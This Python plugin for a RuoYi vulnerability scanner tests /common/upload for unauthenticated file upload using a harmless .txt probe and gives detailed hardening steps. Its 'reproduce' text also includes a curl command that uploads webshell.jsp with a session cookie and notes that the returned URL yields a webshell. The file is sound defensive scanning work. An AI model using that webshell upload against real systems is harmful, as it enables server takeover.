# 任意文件上传：POST /common/upload 上传无害 .txt 探针，按 JSON 响应判定接口可写
from common.models import STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN, ScanResult
from core.http import join_url
from lib.colors import no, ok
from plugins.base import PluginBase


class FileUploadPlugin(PluginBase):
    name = "任意文件上传"
    cve = "N/A"
    severity = "high"
    category = "vuln"
    description = "若依后台 /common/upload 未授权可写：上传无害 .txt 探针，响应 JSON 含 url/fileName 字段即存在"
    fix = "强制 /common/upload 鉴权；服务端白名单校验扩展名；上传目录不可执行；按用户隔离存储路径"
    fix_detail = (
        "【权限加固】为 /common/upload 添加 @PreAuthorize(\"@ss.hasPermi('common:upload')\") 注解\n"
        "【代码修复】CommonController.uploadFile() 添加扩展名白名单校验：\n"
        '  String[] allowed = {"jpg","jpeg","png","gif","bmp","doc","docx","xls","xlsx","ppt","pptx","txt","pdf"};\n'
        '  String ext = fileName.substring(fileName.lastIndexOf(".")+1).toLowerCase();\n'
        '  if (!Arrays.asList(allowed).contains(ext)) { throw new ServiceException("不允许的文件类型"); }\n'
        "【目录加固】上传目录禁止执行权限（nginx: location /profile/ { location ~ \\.(jsp|jspx)$ { deny all; } }）\n"
        "【配置加固】application.yml 限制上传大小：spring.servlet.multipart.max-file-size: 10MB\n"
        "【WAF 规则】拦截 Content-Type 含 multipart/form-data 且无 Cookie 的 /common/upload 请求\n"
        "【合规】OWASP A04:2021 不安全设计；等保 2.0 8.1.4 访问控制"
    )
    reproduce = (
        "# 上传无害 .txt 探针文件验证接口可写：\n"
        'curl -X POST "http://target/common/upload" \\\n'
        '  -F "file=@/tmp/probe.txt;type=text/plain"\n'
        "\n"
        '# 预期响应：HTTP 200 + JSON 含 {"url": "/profile/upload/...", "fileName": "probe.txt"} 字段\n'
        "\n"
        "# 实战利用（上传 webshell.jsp，需登录后台）：\n"
        'curl -X POST "http://target/common/upload" \\\n'
        '  -H "Cookie: JSESSIONID=<已登录的 session>" \\\n'
        '  -F "file=@webshell.jsp;type=application/octet-stream"\n'
        "  # 访问返回的 url 即可获得 webshell"
    )
    # D2：扩展名校验在 4.6.0 加强（但未授权上传仍存在于部分版本，保守标 <4.7）
    affected_versions = ">=4.0,<4.7"
    # D12：CVSS v3.1 + 合规映射
    cvss_vector = "AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:H"
    compliance = "等保2.0:8.1.4;OWASP:A04:2021"
    # D7: WAF 绕过支持
    vuln_type = "rce"
    supports_waf_bypass = True

    # 探针文件名与内容（agents.md §7：仅做存在性验证，不上传可执行文件）
    PROBE_NAME = "ruoyi_scan_probe.txt"
    PROBE_CONTENT = "ruoyi-scan-probe-benign-content"

    def verify(self, target, session):
        url = join_url(target, "common/upload")
        # multipart/form-data：RuoYi 默认字段名为 file
        files = {"file": (self.PROBE_NAME, self.PROBE_CONTENT, "text/plain")}
        try:
            resp = session.post(url, files=files)
        except Exception as e:
            print(no("任意文件上传（网络异常）"))
            return ScanResult(kind="vuln", name=self.name, status=STATUS_UNKNOWN, url=url, evidence=str(e))

        # 响应体文本（错误页可能非 JSON，需容错）
        text = resp.text or ""
        ctype = resp.headers.get("Content-Type", "") if hasattr(resp, "headers") else ""

        # 控误报：必须是 JSON 响应 + 解析成功 + 含 url 或 fileName 字段
        # 不直接判定 200：RuoYi 部分版本上传成功 code=200 但 HTTP 状态可能仍是 200，统一以 JSON 内容为准
        is_json = "json" in ctype.lower() or text.lstrip().startswith("{")
        if not is_json:
            print(no("不存在任意文件上传漏洞"))
            return ScanResult(
                kind="vuln", name=self.name, status=STATUS_SAFE, url=url, evidence="响应非 JSON（疑似已鉴权拦截）"
            )

        try:
            data = resp.json()
        except Exception:
            print(no("不存在任意文件上传漏洞"))
            return ScanResult(kind="vuln", name=self.name, status=STATUS_SAFE, url=url, evidence="响应非合法 JSON")

        # RuoYi 上传响应：{"code":200,"fileName":"...","url":"/profile/upload/...","newFileName":"..."}
        # 部分版本无 code，但必有 url 或 fileName
        up_url = data.get("url") or ""
        file_name = data.get("fileName") or ""
        code = data.get("code")

        # 控误报：url/fileName 非空且 url 以 http 或 / 开头（排除任意字符串响应）
        url_valid = bool(up_url) and (up_url.startswith("http") or up_url.startswith("/"))
        name_valid = bool(file_name)

        # 上传成功判定：要求 url 或 fileName 存在（P1 修复：
        # 修复前裸 code==200 即触发 CONFIRMED，导致 {"code":200} 无上传字段的响应也误报；
        # 现在必须同时满足 url_valid 或 name_valid 才判命中，code==200 单独不触发）
        if (url_valid or name_valid) and code != 401:
            # 进一步排除鉴权拦截：若 msg 含登录关键字，判 SAFE
            msg = str(data.get("msg", ""))
            if any(kw in msg for kw in ["登录", "请先登录", "unauthorized", "未授权"]):
                print(no("不存在任意文件上传漏洞（接口已鉴权）"))
                return ScanResult(
                    kind="vuln", name=self.name, status=STATUS_SAFE, url=url, evidence=f"响应 msg={msg}（疑似拦截）"
                )
            print(ok("存在任意文件上传漏洞"))
            return ScanResult(
                kind="vuln",
                name=self.name,
                severity=self.severity,
                status=STATUS_CONFIRMED,
                url=url,
                evidence=f"上传响应 JSON：code={code} url={up_url} fileName={file_name}",
                extra={"uploaded_url": up_url, "file_name": file_name, "code": code},
                fix=self.fix,
            )

        print(no("不存在任意文件上传漏洞"))
        return ScanResult(
            kind="vuln", name=self.name, status=STATUS_SAFE, url=url, evidence=f"响应未含上传字段：{text[:200]}"
        )
